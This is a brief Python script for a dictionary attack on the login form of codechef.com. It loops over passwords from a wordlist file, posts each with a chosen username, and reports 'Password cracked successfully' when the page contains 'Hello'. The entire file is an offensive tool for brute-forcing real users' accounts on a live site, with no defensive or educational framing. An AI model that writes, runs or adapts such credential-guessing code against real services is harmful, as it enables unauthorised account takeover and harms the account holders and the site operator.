import requests
#from bs4 import BeautifulSoup

#headers={'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'}
dictfile =open('dict.txt','r').readlines()
username=raw_input("Enter username:")
for pas in dictfile:
    password=pas.strip()
    login_info={
        'name': username,
        'pass': password,
        'form_build_id': 'form-M6XdGOYnpCaYT3sz8So_fqauUiVDGNEQM8rpFQiVztM',
        'form_id': 'new_login_form',
        'op': 'Login'
    }
    with requests.Session() as s:
        url="https://www.codechef.com/"
        #page=s.get(url,headers=headers)
        #bsp=BeautifulSoup(u.content,'html5lib')
        page=s.post(url, data=login_info)
        #login_info['form_build_id'] = bsp.find('input', attrs={'name':'form_build_id'})['value']
        content=page.content
        if "Hello" in content:
            print("Password cracked successfully : {}".format(password))
            #print(page.content)
            break
        else:
            print("login Unsuccessfull with password : {}".format(password))
